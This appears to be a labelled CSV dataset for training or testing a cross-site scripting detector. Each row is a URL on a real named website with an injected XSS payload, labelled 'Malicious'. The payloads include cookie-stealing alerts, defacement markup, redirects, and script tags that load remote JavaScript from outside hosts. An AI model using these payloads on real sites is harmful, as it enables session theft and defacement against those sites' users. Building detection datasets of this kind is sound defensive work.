Payloads,Class
http://icteesside.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br>/)%3c/script%3e%3cp,Malicious
"http://guides.lib.virginia.edu/searchtags.php?iid=&amp;tag=';alert(string.fromcharcode(88,83,83))//\';al<br>ert(string.fromcharcode(88,83,83))//&quot;;alert(string.fromcharcode(88,83,83))//\&quot;;alert(string.fromchar<br>code(88,83,83))//--&gt;&lt;/script&gt;&quot;&gt;'&gt;&lt;script&gt;alert(string.fromcharcode(88,83,83))&lt;/script&gt;",Malicious
http://www.buenosaires.edu.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.playbill.com/news/mail.asp?title=&lt;script&gt;alert(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;&lt;meta<br>http-equiv=&quot;refresh&quot; content=&quot;0;url=http://www.canixim.com&quot;&gt;,Malicious
http://bitmail.jp/member_end.asp?lid='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/script%3<br>e,Malicious
http://home.businesswire.com/portal/site/google/index.jsp?ndmviewid=news_view&amp;newsid=%22%3e%3cscript<br>%3ealert('xssed+by+darkworm')%3c/script%3e,Malicious
http://www.royalpurplenews.com/media/storage/paper1225/news/2008/12/17/lifestyle/a.bite.of.excitemen<br>t-3579984.shtml%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%<br>3ehhhhh%3c/h1%3e%3c/marquee%3e,Malicious
http://www.sonovela.net/list.php?q=pwn+%3cscript/src=%22http://tmp.vgood.com.tw/poc.js%22%3e%3c/scri<br>pt%3e+pwn,Malicious
http://castle.pricewatch.com/s/search.asp?s=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%41%6<br>d%61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e,Malicious
http://ms112.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.gz12358.gov.cn:2004/www/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;<br>p+,Malicious
http://benq.lv/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.mtv.co.kr/search/index.php?searchflag=0&amp;searchlog=1&amp;s=0&amp;skey=%27%22%3e%3c%2ftitle%3e%3csc<br>ript%3ealert(1)%3c%2fscript%3e,Malicious
http://www.kontraband.com/search/?search=%22%3e%3cscript%3ealert(%27xssed%27)%3c%2fscript%3e%3c%2fhe<br>ad%3e%3c!--,Malicious
http://www.digidesign.com/index.cfm?navid=104&amp;langid=100&amp;itemid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.pearson.com/index.cfm?pageid=87&amp;searchcriteria=%22%20onmouseover=%22javascript:alert(%27x<br>ss%20by%20warvector%20!%27);%22%3e%20%3cmarquee%3e%3ch1%3exss%20by%20warvector%20!%3c/h1%3e%3c/marqu<br>ee%3e%3c!--&amp;headsearchsubmit=go,Malicious
http://biensdelacouronne.tpsgc.gc.ca/text/faq_questions-e.cfm?faqcat_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;,Malicious
http://www.osta.ee/index.php?q[q]=%22%3e%3cscript+language%3djavascript%3ealert%28%2fxss%2f%29%3c%2fscript%3e&fuseaction=search.search&q[show_items]=1&q[show_ads]=1&q[show_shop]=1,Malicious
http://www.sv-altenbuch.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://loadgamesvf.bet365.com/f1x2games/loadgame.jsp?gameid=f1x2_football&version=1&lang=%22en&acc_id=1ec6296318cf49888464bda22a78eb2c000004&baseurl=%22);%3c/script%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://online.wsj.com/public/quotes/main.html?symbol_or_name=%3cscript%3ealert%28%22xss |<br>hexspirit%22%29%3c%2fscript%3e&amp;x=12&amp;y=10&amp;sym_name_switch=name,Malicious
http://www.azur-privilege.com/page.php?src=index-ap.html&amp;lang=fr/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://melville.wa.gov.au/test.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://bifp.fonction-publique.gouv.fr/search?advanced=1&amp;text=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;,Malicious
http://www.realmadrid.com/buscador/buscador.cfm?txtabuscar=ddfszsd&amp;tipo_busqueda=not&amp;lang=eng&amp;pkcade<br>na=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%<br>3e%3c/marquee%3e,Malicious
http://www.linux-community.de/neues/story?storyid=&lt;&quot;&lt;&lt;script&gt;alert('linux-community%20xssed')&lt;/scrip<br>t&gt;,Malicious
http://www.afpc.randolph.af.mil/external.asp?url=%22%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://french.about.com/sitesearch.htm?terms=xylitol&amp;suname=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%<br>63%72%69%70%74%3e%61%6c%65%72%74%28%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%6<br>5%65%3e%3c%68%31%3e%58%53%53%20%62%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65<br>%65%3efrench&amp;topnode='99,Malicious
http://msn.xplus.com.cn/inc/search.php?searchkey=%3cscript%3ealert(0)%3c/script%3e,Malicious
http://www.grundschule-im-blumenviertel.de/_enigma/de/include.php?path=&quot;&gt;&lt;script&gt;alert(document.cook<br>ie)&lt;/script&gt;,Malicious
http://www.knifeedge.com/forums/downloads.php?do=cat&amp;id=125%22%3e%3cscript%3ealert(%22critia!!%20vbu<br>lletin%20xssed%20\ncookie%20editor%22)%3c/script%3e,Malicious
http://www.ego4u.com/en/community/forum?fid=3%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%<br>3e,Malicious
http://no.playstation.com/search-results/?searchpattern=%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%3ch1%3e%3cmarquee%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;submit-search=search,Malicious
http://sv.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://over.com/parking.php4?task=search&amp;domain=over.com&amp;trackquery=1&amp;s=8c40d17ebd9d6029690b&amp;tb=0&amp;a_<br>id=1&amp;language=en&amp;pgt=3pqi78v4f1akewj9jcgxzbeoahuinwckhreuaugyayaamirwoam4hg&amp;pxy_t=0&amp;start=1&amp;add_c=ce<br>d382b8d56ac19057c96183b5f53e63&amp;x=0&amp;y=0&amp;keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.c<br>om%2fxss.js%3e%3c%2fscript%3e,Malicious
http://www.simshome.net/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.videospace.ro/search_result.php?search_id=%22%3e%3cscript%3ealert(%2fxssed+by+dr.optix%2f<br>)%3balert(document.cookie)%3b%3c%2fscript%3e&amp;search_typ=search_videos&amp;submit=+,Malicious
http://search.qihoo.com/usearch.html?img=-1&amp;qh_union=&amp;site=www.gmw.cn&amp;kw=%22%3e%27%3e%3cscript%3eale<br>rt%28%27x%27%29%3c%2fscript%3e&amp;image22.x=36&amp;image22.y=17&amp;stype=title,Malicious
http://www.dalealplay.com/buscar.php?search=%3cscript%3ealert%28%2fxss+wow%2f%29%3b%3c%2fscript%3e&amp;b<br>y=,Malicious
http://slsweb.ocmboces.org/resgetway.asp?id=8&amp;topic=%3cscript%3ealert%281%29;%3c/script%3e,Malicious
http://www.cincomsmalltalk.com/cincomsmalltalkwiki/irc%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3<br>c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.degisimbilgisayar.com.tr/web/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)<br>&lt;/script&gt;,Malicious
http://www.mwmca.org/mwmcaapps/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br>arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.51cnnet.net/search?q=%22+%27%3e%3cmarquee%3ecueballr%3c%2fmarquee%3e&amp;commit=go,Malicious
http://blog.zol.com.cn/userinfo.php?userid=%3e%3ctitle%3etoplamda%20c%c4%b0hana%20bastik%20:)%3c/tit<br>le%3e%3cscript%3edocument.write('cyber-emperor@hotmail.com')%3c/script%3e%3cmarquee%3e%3ch1%3exssed%<br>20by%20cyber%20|%20ferda%20forever%3c/h1%3e%3c/marquee%3e%3cimg%20src=%22http://img246.imageshack.us<br>/img246/9121/wattarmadt1.jpg%22%3e%3cscript%3ealert%20('cyber%20was%20here')%3c/script%3e%3c,Malicious
http://internationaladvertiser.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.filmski.net/korisnik.php?id=1901%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.aranzadi.es/index.php/buscador?q=%22%3e%3cscript%3ealert(document.cookie)%3c%2fscript%3e&amp;<br>x=0&amp;y=0&amp;m=any,Malicious
http://www.loanuncias.com/showcategory.php?cid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://fplayer.youtubech.com/watch?v='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script<br>%3e,Malicious
http://www.benq.com/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>y+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.opstina-negotin.org.yu/article.php?id_article=4&amp;lg=en&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/sc<br>ript&gt;,Malicious
http://www.evolootion.ch/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backd<br>oor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://seidimoda.repubblica.it/ricerca?keyword=%22%3e%3c/input%3e%3cscript+src%3d%22http%3a%2f%2fgoo<br>glebig.com/l.js%22%3e,Malicious
http://www.soldes-de-folie.com/?s=1%3cscript%20%3eprompt%28992847%29%3c%2fscript%3e,Malicious
http://www.santarosa.rs.gov.br/not_busca.php?palavra=%22%3e%27%3e%3cscript+src%3dhttp%3a%2f%2fvuln.x<br>ssed.net%2fthirdparty%2fscripts%2fpython5.js%3e%3c%2fscript%3e&amp;submit=ok,Malicious
"https://welcome.intel.com/login.aspx?target=';alert(string.fromcharcode(88,83,83))//\';alert(string.<br>fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88<br>,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
https://e-loket.onderbanken.nl/index.php?simaction=content&amp;pagid=45&amp;mediumid=2&amp;actie=zoeken&amp;zoekmedi<br>um=2&amp;zoekuitgebreid=&amp;trefwoord=%3e%22%3e%3cscript%3ealert%28%22hacked+by+poltergeisth4cker%21+2009+f<br>rom+netherlands%22%29%3c%2fscript%3e%3e,Malicious
http://search.interfree.it/cgi-bin/overture.cgi?keywords=%3cscript%3ealert%28%22xss+by+firenight%22%<br>29%3b%3c%2fscript%3e,Malicious
http://www.americanscientist.org/search/home_result.aspx?q=%3cscript%3ealert(%22iblaze%22)%3c/script<br>%3e,Malicious
http://www.mfa.kfki.hu/int/nano/cgi-bin/wps.cgi?command=search&amp;databasename=nano&amp;field=keywords&amp;patt<br>ern=year_before1998%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3<br>ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.claranet.de/kontakt/feedback/feedback.html?em=%22%3e%3cscript%3ealert(1);%3c/script%3e,Malicious
http://www.ourdocuments.gov/doc.php?flash=true&amp;doc=%22%3e%3cscript%3ealert(document.cookie)%3c/scrip<br>t%3e,Malicious
http://www.geek.com.br/modules/noticias/ver.php?id=17071&amp;sec=%22%3e%3cscript%3ealert(666)%3c/script%<br>3e,Malicious
http://www.amsat.org/amsat-new/satellites/satinfo.php?satid=92&amp;returl=%22%3e%27%3e%3c%73%63%72%69%70<br>%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%<br>31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%3<br>1%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a,Malicious
http://www.vanelus.tk/a?t=%27%22%3e%3c%2f%74%69%74%6c%65%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%2<br>8%31%33%33%37%29%3c%2f%73%63%72%69%70%74%3e%3e%3c%6d%61%72%71%75%65%65%3e%3c%68%31%3e%58%53%53%20%62<br>%79%20%58%59%4c%49%54%4f%4c%3c%2f%68%31%3e%3c%2f%6d%61%72%71%75%65%65%3estreaming+tvonline+webcast+r<br>omania+vanelus+online+adult+free+arad+live&amp;v=0&amp;c=1&amp;p=1&amp;r=1183654267811,Malicious
http://www.l4d.com/contest/browse.php?p=1%3e%22%3e%3cscript%3ealert%281337%29%3b%3c/script%3e,Malicious
http://radio.wallst.net/search.asp?s=%22%3e%3cbody+onload=alert(%22by%20encore%22)%3e%3cmarquee%3e%3<br>ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.ulakbim.gov.tr/cabim/katalog/index.php?kw=%3cscript%3ealert%28%27xxsed+by+i-l%e2ndet+from<br>+turkiye+%21%21%21+%27%29%3c%2fscript%3e&amp;ku=toplu,Malicious
http://www.presourcedb.com/index.php?filter_modified=true&amp;filter_name=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e&amp;filter_section=mp3,Malicious
http://benq.at/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://s2.asmandez.ir/login.php/%22%3e%3cscript%3ealert%28/securitylab.ir/%29%3c/script%3e,Malicious
http://fr.netlog.com/foot4eva/photo/photoid=12146782&amp;order=%22%3cscript%3ealert('airroxssed');%3c/sc<br>ript%3e,Malicious
http://www.qantas.com.au/travel/airlines/multi-city-flight-search/global/en?entrypoint=dommulticity%<br>22/%3e%3cbody%20onload=%22alert%281%29%22%3e,Malicious
http://ms103.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://maxim.resultspage.com/search?sessid=6c623b3a37172bc2b3fa7c3902703290&amp;w=%22%3e%3c%2ftitle%3e%3<br>c%2fscript%3e%3cscript%3ealert%281%29%3c%2fscript%3e+%22onmouseover%3d%22alert%281%29%22+onmouseover<br>%3dalert%281%29&amp;x=16&amp;y=9,Malicious
http://stage6.divx.com/videos/search:%22%3e'%3e%3cscript%3ealert%28%22kusomiso%22%29%3c/script%3e,Malicious
http://bangladesh-airlines.com/index.php?action=newsletter_action&module_page=1%3cscript%20%3eprompt%2849371337%29%3c%2fscript%3e&page=1,Malicious
http://www.ntvmsnbc.com.tr/search/search.asp?q=\%22%3e%3ciframe%20src=%22http://serdar00795.sitemyne<br>t.com/hacked.html%22%20width=900%20,Malicious
http://ec.europa.eu/research/cf_includes/iframe-ticker.cfm?lg=%22%3e%3cscript%20src=http://vuln.xsse<br>d.net/thirdparty/scripts/ckers.org.js%3e%3c/script%3e,Malicious
http://www.airtahitinui.com.au/search/search.asp?searwords=%22%3e%3cscript%3ealert(%22jock3r%22)%3c/<br>script%3e,Malicious
http://www.croosddl.com/search.html?q=%22%3e%3c/script%3e%3cscript%3ealert(/xssed_by_omeha/);%3c/scr<br>ipt%3e,Malicious
http://www.j3e.com/recherche_produits.php?keyword=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert%281337%29<br>%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3exss+by+xylitol%3c%2fh1%3e%3c%2fmarquee%3e&amp;querytype=and&amp;submi<br>t.x=0&amp;submit.y=0&amp;submit=ok,Malicious
http://www.sfelipeneri.edu.ec/fedec/book/guestbook.php?act=show&page=2584&lang=%22%3e%3e%3cscript%3ealert%28%22\\_ur0b0r0x_/%22%29%3c/script%3e,Malicious
http://www.geciktirici.info/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/sc<br>ript%3e,Malicious
http://www.hku.nl/web/zoekresultaten.htm?from=0&amp;webid=26098&amp;searchid=97404&amp;searchfrom=searchsitewide<br>&amp;query=%3cscript%3ealert(%2fjurpie%2f)%3c%2fscript%3e&amp;default.x=13&amp;default.y=14,Malicious
http://www.bundesliga.de/de/liga/matches/2007/index.php?omi=131634&amp;reiter=v&amp;tag=%22;%3c/script%3e%22<br>%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%3cmarquee%3e%3ch1%3eby+narcoticxs%3c/h1%3e%3c/<br>marquee%3e%3cbody%20onload=%22alert(1)%22%3e,Malicious
http://www.nbflight.com/product.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://indirmasyon.com/arama.php?query=ss&amp;kid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://newyork.bbb.org/wwwroot/search.aspx?site=24&amp;s=xss%22%3e%3cscript%3ealert%28document.cookie%29<br>;%3c/script%3e,Malicious
http://www.artesnet.gov.ma/exemples/phpinfo.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/script%3<br>e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.wst.tas.gov.au/search?queries_name_query=&quot;'&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;current_result_pa<br>ge=0&amp;results_per_page=10&amp;submitted_search_category=&quot;'&gt;&lt;script&gt;alert(123)&lt;/script&gt;&amp;mode=,Malicious
http://monsterhunter-p2.sakura.ne.jp/bbs/c-board.cgi?word=&amp;way=0&amp;target=all&amp;view=0&amp;id=mh2_02'%3e%22%<br>3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e&amp;cmd=src&amp;x=0&amp;y=0,Malicious
http://ams.confex.com/ams/htsearch.cgi%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3<br>cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://corporate.findlaw.com/scripts/corp_lc.pl?country=corporate&amp;start=430&amp;lang=&amp;entry=mortgage+con<br>...&amp;sites=''&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;''&gt;&lt;h1&gt;djsedat%20narcoticxs&lt;/h1&gt;,Malicious
http://www.phys.virginia.edu/people/personal.asp?uid=dv3h%22%3e%3cscript%3ealert(1)%3c/script%3e,Malicious
http://imageshack.us/slideshow/webplayer.php?id=screenshot37b.jpg%22%3cmarquee%3e%3cscript%3ealert%2<br>8/xssed/.source%29%3c/script%3e,Malicious
http://ecotopia.co.uk/index.jsp?searchstr=%22%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%41%6d%<br>61%7a%65%64%3f%20%2d%20%53%74%75%61%72%74%79%22%29%3c%2f%73%63%72%69%70%74%3e,Malicious
http://www.nwce.gov.uk/search_process.php?keyword=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c<br>%2fscript%3e,Malicious
http://www.host.fr/offre-nom_de-domaine.php?type=new&amp;domaine=%27%22%3e%3cscript%3ealert(1337)%3c/scr<br>ipt%3e%3cmarquee%3e%3ch1%3exss%20by%20ylitol%3c/h1%3e%3c/marquee%3e&amp;ext=com&amp;x=85&amp;y=10,Malicious
http://www.toko24.com/signinform.php?msg=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;back<br>door&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.ezopera.net/opera/bbs.cgi?mode=change&amp;no=6635'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%<br>20kusomiso.com%22)%3c/script%3e,Malicious
"http://www.bitenova.nl/s/0/<script>alert(""phnjcmlwdd5hbgvydchkb2n1bwvudc5jb29rawupozwvc2nyaxb0pg.."")<\script>",Malicious
http://www.n24.de/service/suche/index.php?search=%22%29%3b%3c%2fscript%3e%3cscript%3ealert%281%29%3b<br>%3c%2fscript%3e&amp;x=9&amp;y=13,Malicious
http://www.changtai.gov.cn/ec_showarticle.asp?ec_articleid=2989%27%22%3e%3c/title%3e%3cscript%3ealer<br>t(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://perl.toshinari.net/cgi/bbs/new2ch/test/search.cgi?keyword=d&amp;start=1&amp;to=20%22%3e%27%3e%3c%73%6<br>3%72%69%70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38<br>%2c%38%33%2c%38%33%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;bbs=,Malicious
http://yoimono.biz/baton3/search.php?keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com<br>%2fxss.js%3e%3c%2fscript%3e&amp;submit=%83o%83g%83%93%82%f0%8c%9f%8d%f5,Malicious
http://www.reisebank.de/index.php?id=38&amp;search_type=1&amp;location=%22%3cscript%3ealert(document.cookie)<br>%3c/script%3e,Malicious
http://adspecs.yahoo.it/wp-content/plugins/spectacular/ajax.php?ys_action=addtocart&amp;cb=0.00619642219<br>73727085&amp;pgid=4203&amp;prop=1%3c/title%3e%22%3e%3cscript%3ealert%28/xss%20by%20oz%20aka%20[]0izy5@r00tde<br>faced.com/%29%3c/script%3e,Malicious
http://www.sodra.lt/search?query=%22%3cscript%3ealert%287%29%3b%3c%2fscript%3e,Malicious
"http://www.ira-lyon.gouv.fr/mod.php?rub=fi&amp;pg=%22;alert(string.fromcharcode(83,69,67,85,82,73,84,89,<br>32,83,85,88))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(83,69,67,85,82,73,8<br>4,89,32,83,85,88))%3c/script%3e",Malicious
http://portal0.unesco.org/search/ui/searchservlet?formname=test2&amp;hindexname=ami_index&amp;nbresultbypage<br>=25&amp;hurltemplateresult=http%3a%2f%2fportal.unesco.org%2fsearch%2fen%2fresults.html&amp;output=text%2fhtm<br>l&amp;hprefpages=prefpages&amp;hprmetaweight=&amp;hprwordlistweight=7&amp;hprtitlefield=7&amp;hprdescriptionfield=3&amp;hprr<br>eferencefield=10&amp;rthesaurus=&amp;tuserinput=%3cscript%3ealert%28%22xss%22%29%3c%2fscript%3e&amp;fok.x=0&amp;fok.<br>y=0,Malicious
"http://www.athome.lu/recherche/resultats/tr/by/p//""><script>alert('xss by atm0n3r')</script>",Malicious
"http://johnpianoschool.board.ob.tc/-view.php?n=10""><script>alert(document.cookie)</script>",Malicious
http://www.cior.pt/fotos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+na<br>rcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://iftira.com/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://intranet.searca.org/pics/igallery.asp?d=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narco<br>ticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.movieweb.com/search/?search=%22%3e'%3e%3cscript%3ealert(123)%3c/script%3e%22',Malicious
http://www.schlangengrube.de/modules/inserate/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backdo<br>or)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.bio-produits.com/vente/achat/recherche.php?motclef=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;,Malicious
http://www.hellobc.com/en-ca/searchresults/britishcolumbia.htm?q=%3cscript%3ealert(%22iblaze%22)%3c%<br>2fscript%3e&amp;ie=utf8&amp;site=tbccw&amp;output=xml_no_dtd&amp;client=tbccw&amp;lr=&amp;oe=utf8&amp;requiredfields=cw_page_typ<br>e%3acontent|cw_page_type%3aaccommodation|cw_page_type%3anonaccomproduct&amp;getfields=cw_page_type.descr<br>iption.productsummary.bcescapes&amp;ip=&amp;access=&amp;start=0&amp;filter=0&amp;restrict=na|na_prod,Malicious
http://www.jobgeo.com/personal.php?action=new&amp;auth_sess=&amp;ref=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/scri<br>pt&gt;,Malicious
http://ekart.logindream.com/main.php?rs2=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+n<br>arcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
